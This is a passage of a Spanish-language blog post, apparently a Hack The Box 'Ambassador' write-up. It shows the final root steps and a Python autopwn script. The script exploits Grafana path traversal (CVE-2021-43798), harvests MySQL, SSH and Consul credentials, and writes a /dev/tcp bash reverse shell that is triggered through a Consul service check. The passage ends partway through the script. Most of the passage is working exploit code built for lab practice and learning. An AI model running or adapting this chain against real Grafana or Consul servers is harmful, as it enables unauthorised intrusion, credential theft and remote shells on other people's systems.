</span><span class="gp">root@ambassador:/#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> <span class="se">\;</span>
<span class="gp">find / -name root.txt -exec ls -l {} \;</span><span class="w">
</span><span class="go">-rw-r----- 1 root root 33 Nov 23 17:05 /root/root.txt
</span></pre></table></code></div></div><p>Luego de esto es importante <strong>desactivar el servicio</strong>, lo hacemos con el siguiente comando:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">developer@ambassador:/tmp/.10.10.14.155$</span><span class="w"> </span>curl <span class="nt">-X</span> PUT <span class="nt">-H</span> <span class="s1">'X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5'</span> <span class="se">\</span>
<span class="go">  http://localhost:8500/v1/agent/service/deregister/marss_service
</span></pre></table></code></div></div><h2 id="autopwn"><span class="mr-2">Autopwn</span><a href="#autopwn" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Para seguir mejorando el scripting hice un autopwn en <code class="language-plaintext highlighter-rouge">python</code> para automatizar todo el proceso:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="s">"""
Autopwn Assambador HTB
----------------------
Author: Marss
Date: 21 Nov, 2022
"""</span>

<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">sqlite3</span>

<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
<span class="kn">from</span> <span class="nn">json</span> <span class="kn">import</span> <span class="n">dumps</span>
<span class="kn">from</span> <span class="nn">mysql</span> <span class="kn">import</span> <span class="n">connector</span>
<span class="kn">from</span> <span class="nn">paramiko</span> <span class="kn">import</span> <span class="n">AutoAddPolicy</span><span class="p">,</span> <span class="n">SSHClient</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">choice</span>
<span class="kn">from</span> <span class="nn">re</span> <span class="kn">import</span> <span class="n">findall</span>
<span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">Session</span>
<span class="kn">from</span> <span class="nn">signal</span> <span class="kn">import</span> <span class="n">signal</span><span class="p">,</span> <span class="n">SIGINT</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="nb">exit</span>

<span class="c1">## Ctrl + c
# (function)
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
	<span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] User terminated.'</span><span class="p">)</span>

<span class="c1"># (signal)
</span><span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>


<span class="c1">## Global variables
# grafana plugins
</span><span class="n">plugins</span> <span class="o">=</span> <span class="p">[</span> 
	<span class="s">"alertlist"</span><span class="p">,</span>
	<span class="s">"annolist"</span><span class="p">,</span>
	<span class="s">"barchart"</span><span class="p">,</span>
	<span class="s">"bargauge"</span><span class="p">,</span>
	<span class="s">"candlestick"</span><span class="p">,</span>
	<span class="s">"cloudwatch"</span><span class="p">,</span>
	<span class="s">"dashlist"</span><span class="p">,</span>
	<span class="s">"elasticsearch"</span><span class="p">,</span>
	<span class="s">"gauge"</span><span class="p">,</span>
	<span class="s">"geomap"</span><span class="p">,</span>
	<span class="s">"gettingstarted"</span><span class="p">,</span>
	<span class="s">"grafana-azure-monitor-datasource"</span><span class="p">,</span>
	<span class="s">"graph"</span><span class="p">,</span>
	<span class="s">"heatmap"</span><span class="p">,</span>
	<span class="s">"histogram"</span><span class="p">,</span>
	<span class="s">"influxdb"</span><span class="p">,</span>
	<span class="s">"jaeger"</span><span class="p">,</span>
	<span class="s">"logs"</span><span class="p">,</span>
	<span class="s">"loki"</span><span class="p">,</span>
	<span class="s">"mssql"</span><span class="p">,</span>
	<span class="s">"mysql"</span><span class="p">,</span>
	<span class="s">"news"</span><span class="p">,</span>
	<span class="s">"nodeGraph"</span><span class="p">,</span>
	<span class="s">"opentsdb"</span><span class="p">,</span>
	<span class="s">"piechart"</span><span class="p">,</span>
	<span class="s">"pluginlist"</span><span class="p">,</span>
	<span class="s">"postgres"</span><span class="p">,</span>
	<span class="s">"prometheus"</span><span class="p">,</span>
	<span class="s">"stackdriver"</span><span class="p">,</span>
	<span class="s">"stat"</span><span class="p">,</span>
	<span class="s">"state-timeline"</span><span class="p">,</span>
	<span class="s">"status-history"</span><span class="p">,</span>
	<span class="s">"table"</span><span class="p">,</span>
	<span class="s">"table-old"</span><span class="p">,</span>
	<span class="s">"tempo"</span><span class="p">,</span>
	<span class="s">"testdata"</span><span class="p">,</span>
	<span class="s">"text"</span><span class="p">,</span>
	<span class="s">"timeseries"</span><span class="p">,</span>
	<span class="s">"welcome"</span><span class="p">,</span>
	<span class="s">"zipkin"</span>
<span class="p">]</span>

<span class="c1">## Main class
</span><span class="k">class</span> <span class="nc">Exploit</span><span class="p">:</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">args</span> <span class="o">=</span> <span class="n">args</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">target_host</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">'ip_address'</span> <span class="p">:</span> <span class="s">'10.10.11.183'</span><span class="p">,</span>
			<span class="s">'grafana_service'</span> <span class="p">:</span> <span class="s">'http://10.10.11.183:3000'</span>
		<span class="p">}</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">target_files</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">'grafana_conf'</span> <span class="p">:</span> <span class="s">'/etc/grafana/grafana.ini'</span><span class="p">,</span>
			<span class="s">'grafana_db'</span> <span class="p">:</span> <span class="bp">None</span>
		<span class="p">}</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">'mysql'</span> <span class="p">:</span> <span class="p">{</span>
				<span class="s">'user'</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
				<span class="s">'pass'</span> <span class="p">:</span> <span class="bp">None</span>
			<span class="p">},</span>
			<span class="s">'ssh'</span> <span class="p">:</span> <span class="p">{</span>
				<span class="s">'user'</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
				<span class="s">'pass'</span> <span class="p">:</span> <span class="bp">None</span>
			<span class="p">},</span>
			<span class="s">'consul'</span> <span class="p">:</span> <span class="p">{</span> <span class="s">'token'</span> <span class="p">:</span> <span class="bp">None</span> <span class="p">}</span>
		<span class="p">}</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">json_file</span> <span class="o">=</span> <span class="s">'payload.json'</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">shell_file</span> <span class="o">=</span> <span class="s">'shell.sh'</span>

	<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="s">"""
		Exploit process:
		----------------
		(1) Grafana plugin url [CVE-2021-43798] (Directory Path Traversal)
			* Database path into Grafana config file
		
		(2) SQLite enumeration in Grafana database file
			* Mysql credentials

		(3) Mysql enumeration
			* SSH credentials

		(4) Vulnerable path in Consul service registration (Remote Code Execution)
			* [Requirements] 
				- Consul token (Leakage Information in git repository)
		"""</span>
		<span class="k">with</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Starting Attack'</span><span class="p">)</span> <span class="k">as</span> <span class="n">progress</span><span class="p">:</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Grafana plugin url [CVE-2021-43798] (Directory Path Traversal)'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">extract_file</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">target_files</span><span class="p">[</span><span class="s">'grafana_conf'</span><span class="p">])</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Searching grafana.db path in config file'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">get_database_path</span><span class="p">()</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">extract_file</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">target_files</span><span class="p">[</span><span class="s">'grafana_db'</span><span class="p">])</span>
			
			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'SQLite enumeration in Grafana database file'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">get_mysql_cred</span><span class="p">()</span>
			
			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Login to Mysql with credentials'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">extract_ssh_cred</span><span class="p">()</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Prepare .json and .sh file'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">prepare_files</span><span class="p">()</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Creating Consul service to receive the shell'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">get_shell</span><span class="p">()</span>

	<span class="k">def</span> <span class="nf">extract_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">file</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="k">with</span> <span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
				<span class="n">vulnerable_path</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">[</span><span class="s">'grafana_service'</span><span class="p">]</span> \
					<span class="o">+</span> <span class="s">'/public/plugins/'</span> \
					<span class="o">+</span> <span class="n">choice</span><span class="p">(</span><span class="n">plugins</span><span class="p">)</span> \
					<span class="o">+</span> <span class="s">'/..'</span><span class="o">*</span><span class="mi">8</span> \
					<span class="o">+</span> <span class="nb">file</span>

				<span class="n">request</span> <span class="o">=</span> <span class="n">Request</span><span class="p">(</span><span class="n">method</span><span class="o">=</span><span class="s">'GET'</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">vulnerable_path</span><span class="p">)</span>

				<span class="n">prepare_request</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">prepare_request</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
				<span class="n">prepare_request</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">vulnerable_path</span>

				<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">prepare_request</span><span class="p">)</span>

				<span class="k">if</span> <span class="s">'Plugin not found'</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
					<span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] File not found.'</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
						<span class="n">file_name</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'/'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># extract only file name
</span>
						<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
							<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>

						<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'(CVE-2021-43798) Extracted file -&gt; </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
		
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">get_database_path</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">file_name</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">target_files</span><span class="p">[</span><span class="s">'grafana_conf'</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'/'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># extract only file name
</span>
			<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
				<span class="n">content</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

				<span class="n">filter_data</span> <span class="o">=</span> <span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">';data = (.+)|;path = (.+)'</span><span class="p">,</span> <span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>

				<span class="n">database_path</span> <span class="o">=</span> <span class="n">filter_data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">filter_data</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>

				<span class="bp">self</span><span class="p">.</span><span class="n">target_files</span><span class="p">[</span><span class="s">'grafana_db'</span><span class="p">]</span> <span class="o">=</span> <span class="n">database_path</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">get_mysql_cred</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">file_name</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">target_files</span><span class="p">[</span><span class="s">'grafana_db'</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'/'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># extract only file name
</span>
			<span class="k">with</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">file_name</span><span class="p">)</span> <span class="k">as</span> <span class="n">connection</span><span class="p">:</span>
				<span class="n">cursor</span> <span class="o">=</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>

				<span class="n">query</span> <span class="o">=</span> <span class="s">'SELECT user, password FROM data_source'</span>
				<span class="n">response</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

				<span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>

				<span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'mysql'</span><span class="p">][</span><span class="s">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
				<span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'mysql'</span><span class="p">][</span><span class="s">'pass'</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span>

				<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Mysql credentials -&gt; {}:{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">));</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">extract_ssh_cred</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">connection</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">[</span><span class="s">'ip_address'</span><span class="p">],</span>
										   <span class="n">database</span><span class="o">=</span><span class="s">'whackywidget'</span><span class="p">,</span>
										   <span class="n">user</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'mysql'</span><span class="p">][</span><span class="s">'user'</span><span class="p">],</span>
										   <span class="n">password</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'mysql'</span><span class="p">][</span><span class="s">'pass'</span><span class="p">])</span>

			<span class="k">if</span> <span class="n">connection</span><span class="p">.</span><span class="n">is_connected</span><span class="p">():</span>
				<span class="n">cursor</span> <span class="o">=</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>

				<span class="n">query</span> <span class="o">=</span> <span class="s">'SELECT user, pass from users'</span>
				<span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

				<span class="n">username</span><span class="p">,</span> <span class="n">b64_password</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>

				<span class="c1"># decode base64 password
</span>				<span class="n">b64_bytes</span> <span class="o">=</span> <span class="n">b64_password</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
				<span class="n">msg_bytes</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">b64_bytes</span><span class="p">)</span>
				<span class="n">password</span> <span class="o">=</span> <span class="n">msg_bytes</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>

				<span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'ssh'</span><span class="p">][</span><span class="s">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
				<span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'ssh'</span><span class="p">][</span><span class="s">'pass'</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span>

				<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'SSH credentials -&gt; {}:{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">));</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>
		<span class="k">finally</span><span class="p">:</span>
			<span class="k">if</span> <span class="n">connection</span><span class="p">.</span><span class="n">is_connected</span><span class="p">():</span>
				<span class="n">cursor</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
				<span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

	<span class="k">def</span> <span class="nf">ssh_connection</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">ssh_client</span> <span class="o">=</span> <span class="n">SSHClient</span><span class="p">()</span>
			<span class="n">ssh_client</span><span class="p">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">AutoAddPolicy</span><span class="p">())</span>
			<span class="n">ssh_client</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">[</span><span class="s">'ip_address'</span><span class="p">],</span>
							   <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">,</span>
							   <span class="n">username</span><span class="o">=</span><span class="n">user</span><span class="p">,</span>
							   <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>

			<span class="k">return</span> <span class="n">ssh_client</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">get_consul_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ssh_client</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">command</span> <span class="o">=</span> <span class="s">"cd /opt/my-app/ &amp;&amp; git show"</span> <span class="c1"># path repository
</span>			<span class="n">_stdin</span><span class="p">,</span> <span class="n">_stdout</span><span class="p">,</span> <span class="n">_stderr</span> <span class="o">=</span> <span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

			<span class="n">output</span> <span class="o">=</span> <span class="n">_stdout</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
			<span class="n">token</span> <span class="o">=</span> <span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'--token (.*?) '</span><span class="p">,</span> <span class="n">output</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

			<span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'consul'</span><span class="p">][</span><span class="s">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="n">token</span>

			<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Consul token -&gt; {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">token</span><span class="p">));</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error %s:'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">prepare_files</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="c1"># reverse shell file
</span>		<span class="n">shell_data</span> <span class="o">=</span> <span class="s">"#!/bin/bash</span><span class="se">\n\n</span><span class="s">/bin/bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>

		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">shell_file</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
			<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">shell_data</span><span class="p">)</span>

			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'File created : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">shell_file</span><span class="p">));</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

		<span class="c1"># consul service RCE file
</span>		<span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">"ID"</span><span class="p">:</span> <span class="s">"autopwn_shell"</span><span class="p">,</span>
			<span class="s">"Name"</span><span class="p">:</span> <span class="s">"pwn"</span><span class="p">,</span>
			<span class="s">"Address"</span><span class="p">:</span> <span class="s">"127.0.0.1"</span><span class="p">,</span>
			<span class="s">"Port"</span><span class="p">:</span> <span class="mi">80</span><span class="p">,</span>
			<span class="s">"Check"</span><span class="p">:</span> <span class="p">{</span>
				<span class="s">"DeregisterCriticalServiceAfter"</span><span class="p">:</span> <span class="s">"90m"</span><span class="p">,</span>
				<span class="s">"Args"</span><span class="p">:</span> <span class="p">[</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"/tmp/.</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">/shell.sh"</span><span class="p">],</span>
				<span class="s">"Interval"</span><span class="p">:</span> <span class="s">"10s"</span><span class="p">,</span>
				<span class="s">"Timeout"</span><span class="p">:</span> <span class="s">"86400s"</span>
			<span class="p">}</span>
		<span class="p">}</span>

		<span class="n">json_obj</span> <span class="o">=</span> <span class="n">dumps</span><span class="p">(</span><span class="n">json_data</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>

		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">json_file</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
